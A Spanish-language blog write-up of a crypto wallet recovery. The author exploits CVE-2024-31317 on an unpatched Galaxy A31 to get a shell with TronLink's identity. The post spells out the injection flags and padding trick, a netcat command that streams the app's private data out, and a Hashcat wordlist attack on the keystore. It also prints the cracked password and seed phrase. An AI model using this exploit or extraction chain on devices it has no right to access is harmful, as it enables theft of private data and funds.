+++
title = "Recuperando una wallet de TRON con un exploit de Android y fuerza bruta"
date = "2026-03-22T03:00:00-03:00"
readingTime = true
+++

Me cae un cliente con un problema que se repite mucho: tiene una wallet de TRON en el celular, la seed phrase terminó en la basura hace años y no se acuerda la contraseña de la app. La plata sigue ahí, la puede ver en la blockchain, pero no la puede usar. Por suerte no perdió el celular ni borró nada en todo este tiempo. Acordamos un fee y me pongo a ver qué se puede hacer.

![Nagato Yuki de Suzumiya Haruhi no Yuuutsu](nagato_yuuki.gif)

<!--more-->

Lo primero que hago en estos casos es anotar todo, cualquier detalle puede ser clave:

- Modelo: Galaxy A31
- Android: 12
- Última actualización: enero de 2024
- App: TronLink Pro
- Regla de contraseña: mínimo 8 caracteres, una mayúscula, una minúscula y un número

Le pido que me tire todo lo que recuerde sobre la contraseña. Palabras, números, símbolos, nombres, apodos, familiares, fechas, patrones, cualquier cosa que le venga a la cabeza. Abro la app y pruebo un par de contraseñas manualmente. A los pocos intentos me bloquea por 1 hora.

<img alt="Pantalla de creación de wallet en TronLink Pro mostrando los requisitos de contraseña" src="/en/blog/tronlink-wallet-recovery/utj3xfqnnr_ttx7n2vfop.png" style="max-width: min(280px, 100%)" />

Seguir por ese camino va a ser imposible, así que el trabajo se parte en dos:

1. **Sacar la wallet cifrada del teléfono sin romper nada**
2. **Llevarla a una PC para crackear la contraseña offline**, sin el rate limit de la UI

Todo lo que cuento acá está replicado en este repositorio:

[https://github.com/astrovm/2026-03-tronlink-wallet-recovery-reference](https://github.com/astrovm/2026-03-tronlink-wallet-recovery-reference)

## Fase 1: sacar la wallet del teléfono

TronLink guarda todo lo sensible adentro del directorio privado de la app:

```text
/data/data/com.tronlinkpro.wallet
```

Solo la app y root pueden acceder a ese directorio. Y claro, el teléfono no está rooteado. Rootearlo tampoco es opción porque en muchos equipos Samsung desbloquear el bootloader formatea todo.

En los primeros años de Android los fabricantes no te dejaban desbloquearlo y el rooteo dependía de vulnerabilidades específicas de cada versión, así que era común rootear sin perder datos. Hoy en día se usan métodos oficiales que borran todo por default.

### Buscar una forma de entrar sin root

Lo más lógico es buscar vulnerabilidades conocidas del sistema. Y acá tengo suerte: el software del Galaxy A31 viene bastante atrasado. Android 12, parche de seguridad de enero de 2024. Eso significa que hay 2 años de vulnerabilidades publicadas que nunca fueron parcheadas en este equipo. Arranca la parte más divertida de hacer este tipo de laburos.

Con la ayuda de Grok llego al **CVE-2024-31317**, un bug en `ZygoteProcess.java` que parchearon en junio de 2024. Este exploit te permite ejecutar código con la identidad de **cualquier app** del dispositivo. No necesitás root. Solo `adb`. Este mismo exploit lo usa software forense como Oxygen, que usan policías y agencias de inteligencia de todo el mundo para extraer datos de teléfonos.

El Galaxy A31 nunca recibió ese parche, así que es explotable. Excelente. Me pongo a entender cómo funciona.

![Viendo la Matrix](matrix.gif)

### Cómo funciona el exploit

Para entender el bug hay que arrancar por otro lado. En Android existe un setting global llamado `hidden_api_blacklist_exemptions` (en `Settings.Global`). Google lo usa para indicar qué APIs internas ocultas pueden usar ciertas apps del sistema sin restricción. Se puede escribir desde `adb shell` porque ese contexto ya tiene el permiso `WRITE_SECURE_SETTINGS`.

¿Y quién lee este setting? **Zygote**. Zygote es el proceso privilegiado de userland que arranca todas las apps en Android. En vez de crear cada app desde cero, Zygote ya tiene el runtime precargado: se forkea a sí mismo y ese proceso hijo se transforma en la app que necesitás. Por su posición entre kernel y apps es un punto muy sensible.

El bug está en que Zygote recibe el valor de `hidden_api_blacklist_exemptions` **sin sanitizar newlines**. Si metés `\n` en el valor del setting, podés inyectar comandos completos en el protocolo de Zygote. Y como Zygote puede cambiar su UID, acepta comandos como `--setuid`, `--setgid`, `--app-data-dir`, `--package-name`... O sea que le podés decir "creame un proceso que **sea** TronLink". Y lo hace. El proceso resultante tiene la identidad exacta de la app, con acceso completo a sus archivos privados.

Pero escribir el setting no alcanza. Zygote no lo relee solo. Hay que forzar que la app de Settings de Android se reinicie (`am force-stop com.android.settings` y después `am start`). Cuando Settings arranca, le reenvía los settings globales a Zygote por su socket, y ahí es cuando Zygote parsea el valor cambiado y ejecuta los comandos inyectados.

Para complicar las cosas, en Android 12+ Google agregó `NativeCommandBuffer`, un buffer que dropea bytes sobrantes. Si mandás el payload directo, el buffer se llena y descarta todo. La solución es mandar primero ~8192 bytes de padding para forzar un flush, y que los argumentos reales lleguen en una escritura separada.

Para que esto funcione necesitás Android 9-14 sin el parche de junio de 2024, y `adb shell` (que ya tiene `WRITE_SECURE_SETTINGS` por default). Dato importante: si dejás el setting modificado y el teléfono se reinicia, entra en **boot loop**. Así que siempre hay que limpiar después, sí o sí.

Estos repos me ahorraron un montón de laburo:

- [https://github.com/agg23/cve-2024-31317](https://github.com/agg23/cve-2024-31317)
- [https://github.com/Anonymous941/zygote-injection-toolkit](https://github.com/Anonymous941/zygote-injection-toolkit)

### Probarlo primero en emulador

Antes de tocar el teléfono real levanto un emulador que simule lo mismo.

<img alt="Emulador Android 12 (API 31) con pantalla de inicio lista para pruebas" src="/en/blog/tronlink-wallet-recovery/v04-fjag_lnomy9qjva_b.png" style="max-width: min(280px, 100%)" />

Le instalo la misma versión de TronLink, genero una wallet de prueba y me pongo a reproducir todo el exploit.

Confirmo que el emulador esté visible por `adb`:

```bash
$ adb devices
```


```text
List of devices attached
emulator-5554   device
```

Saco el UID de TronLink:

```bash
$ adb shell pm dump com.tronlinkpro.wallet | grep userId
```


```text
    userId=10145
```

Con la ayuda de Gemini toco `zygote-injection-toolkit` para arreglar un par de errores y adaptarlo a este caso. El payload necesita los flags exactos para que Zygote me levante un proceso con la identidad de TronLink:

- `--setuid` y `--setgid` con el UID de la app
- `--setgroups=3003` (inet, necesario para que el proceso pueda usar sockets)
- `--app-data-dir=/data/user/0/com.tronlinkpro.wallet`
- `--package-name=com.tronlinkpro.wallet`
- `--target-sdk-version=30`
- `--is-top-app`
- `--seinfo=default:targetSdkVersion=30:complete`


Todo esto lo meto en `repro.py`. Arma el payload con el padding para Android 12+, lo inyecta vía `adb shell`, fuerza el reinicio de Settings para triggerear la lectura, y espera a que un netcat se levante en localhost. Si funciona, tenés una reverse shell con la identidad de TronLink. Si falla, limpia el setting para no dejar el teléfono en mal estado.

```bash
$ uv run repro.py --uid 10145 --gid 10145
```


```text
Injecting payload for UID 10145 and package com.tronlinkpro.wallet...
Injection sent. Waiting for listener...
Listener is UP!
```

`Listener is UP!`. Funciona. Ya tengo confirmado que puedo entrar. Ahora toca hacerlo en el teléfono real, donde no hay margen de error.

### Extraer el dump completo

Lo replico en el teléfono real. Mismos pasos, mismo script, y anda. Estoy adentro.

En vez de ir archivo por archivo, comprimo todo y lo mando directo a la PC por `netcat`:

```bash
$ printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 127.0.0.1 1234 | base64 -d > recovery.tar.gz
```

![File transfer](file_transfer.gif)

Con eso me traigo el app data completo: `shared_prefs`, `databases`, etc. Fase 1 completa. El teléfono del cliente queda intacto, sin root, sin bootloader desbloqueado, sin nada roto. Y yo tengo lo que necesito en mi PC.

## Fase 2: crackear la contraseña offline

Ahora viene lo que define si no fue todo al pedo. Me pongo a revisar el dump y el archivo clave es este:

```text
recovery/shared_prefs/carlitosmenem991.xml
```

Adentro está todo:

- `wallet_name_key`: `carlitosmenem991`
- `wallet_address_key`: `TFbkzYHUvCVuybLKRQuDQmpNYw3HaViyvd`
- `wallet_keystore_key`: el keystore cifrado (la clave privada, protegida con la contraseña)
- `wallet_newmnemonic_key`: la seed phrase cifrada (también protegida con la misma contraseña)

Cruzo con otros XML del dump para confirmar que es la wallet correcta:

- En `f_TronKey.xml`, `selected_wallet_key` apunta a `carlitosmenem991`
- En `f_Tron_3.8.0.xml`, `key_recently_wallet` también lista `carlitosmenem991`

### El cifrado

TronLink usa el mismo esquema que las wallets de Ethereum (V3 keystore). La contraseña pasa por **scrypt** (n=16384, r=8, p=1, lento a propósito y pesado en memoria), que te da 32 bytes: los primeros 16 cifran la clave privada con **AES-128-CTR**, los últimos 16 generan una **MAC** (keccak256) que queda guardada en el keystore.

Para probar un candidato corrés scrypt, calculás la MAC, y la comparás contra la que está guardada. El tema es que scrypt es pesado por diseño: con una buena GPU estamos hablando de miles de intentos por segundo, no billones como con MD5. Así que importa mucho qué contraseñas probás.

### Extraer el hash para Hashcat

Me armo `tools/extract_hash.py` que lee el XML, saca el JSON del keystore y lo convierte al formato que entiende Hashcat (modo 15700, Ethereum wallet):

```bash
$ uv run tools/extract_hash.py recovery/shared_prefs/carlitosmenem991.xml > target.hash
$ cat target.hash
```


```text
$ethereum$s*16384*8*1*2ef2a618edbf5185c6e7062a39d5dcdb81ba683dc2f8ca01ce8ed8c5959bb12c*cc8bab0bc8701e9af687a4b4b6b527f962de582efb029b507fc90cfc393ecfd5*ffcf36eb0aaee16f676049a12307e247a868133dbd1d8c956cee6682f54b0704
```

Antes de meterme con los datos reales, testeo todo el flow con la wallet de prueba del emulador. Cierra perfecto, así que repito con los datos del cliente.

### Atacando patrones humanos

Con scrypt de por medio, un brute force puro es inviable. Probar todas las combinaciones posibles llevaría literalmente años. Por suerte la gente no arma contraseñas random: usa nombres, fechas, apodos, cosas que significan algo para ellos. Así que agarro todo lo que me dijo el cliente y lo junto con lo que saqué de los XML.

Del cliente saqué nombres propios, apodos y apellidos de la familia: carlos, carlitos, turco, zulemita, menem, saul. Números que podían tener significado: 7, 91, 991, 1991. Y símbolos comunes: #, ., !, @. Del dump ya tenía el nombre de la wallet (`carlitosmenem991`).

Con ayuda de Codex me armo un framework en Python, `smart_recovery/`, que toma todas esas semillas y genera wordlists ordenadas de más probable a menos probable. También descarta todo lo que no cumpla las reglas de la wallet (8+ caracteres, mayúscula, minúscula y número), así no pierde tiempo con combinaciones que nunca podrían ser.

La idea es generar familias de patrones por prioridad y que agote lo más probable antes de caer en fuerza bruta. Algunas familias:

| Familia | Patrón | Ejemplos |
|---|---|---|
| `compose.name-number` | nombre + número | `Carlitos7`, `Turco1991`, `Zulemita91` |
| `compose.name-extension-number` | nombre + apellido + número | `CarlitosMenem7`, `Turcosaul991`, `Carlossaul91` |
| `compose.name-number-symbol` | nombre + número + símbolo | `Carlitos7!`, `Turco1991#`, `Zulemita7@` |
| `mutate.toggle-case-*` | las anteriores con todas las variantes de mayúsculas | `tURCOSAUL7`, `tuRcosaul7`, `CARLITOS7!` |

Cada familia genera variantes de mayúsculas (`carlitosmenem`, `CarlitosMenem`, `Carlitosmenem`), orden (`Turco7`, `7Turco`) y símbolos opcionales (`Turcosaul7`, `Turcosaul7!`, `Turcosaul!7`). Las familias `mutate.*` van más allá y usan reglas de hashcat para probar todas las combinaciones de mayúsculas/minúsculas directo en la GPU, sin explotar la wordlist. El framework guarda estado entre ejecuciones así no repite trabajo.

Lo pongo a correr contra Hashcat y me voy a dormir.

```bash
uv run -m smart_recovery run --hash-file target.hash --seed-file note_seeds.json --recovery-root recovery
```

<img alt="Hashcat corriendo en modo Ethereum Wallet SCRYPT mostrando progreso del ataque" src="/en/blog/tronlink-wallet-recovery/qzcle-ah0fwm-svkgj1mj.png" style="max-width: min(480px, 100%)" />

Después de unas 30 horas entre validación, pruebas previas y distintas ejecuciones... CRACKED.

<img alt="Hashcat mostrando estado Cracked tras encontrar la contraseña correcta" src="/en/blog/tronlink-wallet-recovery/wylrwidwumnnrpsmqpcxr.png" style="max-width: min(480px, 100%)" />


```text
$ethereum$s*16384*8*1*2ef2a618edbf5185c6e7062a39d5dcdb81ba683dc2f8ca01ce8ed8c5959bb12c*cc8bab0bc8701e9af687a4b4b6b527f962de582efb029b507fc90cfc393ecfd5*ffcf36eb0aaee16f676049a12307e247a868133dbd1d8c956cee6682f54b0704:Turcosaul7
```

Apodo + segundo apellido + número. "Turco" + "saul" + "7" = `Turcosaul7`.

## Fase 3: reconstruir la seed y recuperar los fondos

Con la contraseña en la mano, el resto es un trámite. La misma contraseña protege tanto el keystore como el mnemonic, así que si tenés una, tenés todo.


Me armo `tools/decrypt_mnemonic.py` que lee el mnemonic cifrado del XML, lo descifra con la contraseña y te tira la seed phrase.

```bash
$ uv run tools/decrypt_mnemonic.py recovery/shared_prefs/carlitosmenem991.xml Turcosaul7
```


```text
stock dirt cat upset chat giraffe page blade face slush volcano dawn
```

Importo la wallet en otro dispositivo y retiro los fondos.

---

Al final todo se dio por una cadena de cosas que salieron bien: el teléfono sobrevivió al tiempo, Android no estaba parcheado, el exploit funcionó sin romper nada, la password seguía un patrón humano predecible, y el cliente se acordaba de suficientes pistas como para acotar el espacio de búsqueda.

Si cualquiera de esas cosas hubiera sido diferente, la plata seguiría ahí trabada para siempre. Así que cuiden sus seeds, porque capaz no hay un CVE que los salve.

## Referencias

- [Android Security Bulletin junio 2024](https://source.android.com/docs/security/bulletin/2024-06-01)
- [CVE-2024-31317 en NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)
- [Patch de AOSP](https://android.googlesource.com/platform/frameworks/base/+/e25a0e394bbfd6143a557e1019bb7ad992d11985)
- [Recopilación sobre CVE-2024-31317 en GitHub](https://github.com/agg23/cve-2024-31317)
- [Zygote Injection Toolkit](https://github.com/Anonymous941/zygote-injection-toolkit)
- [Repo de este caso con ejemplo y herramientas](https://github.com/astrovm/2026-03-tronlink-wallet-recovery-reference)
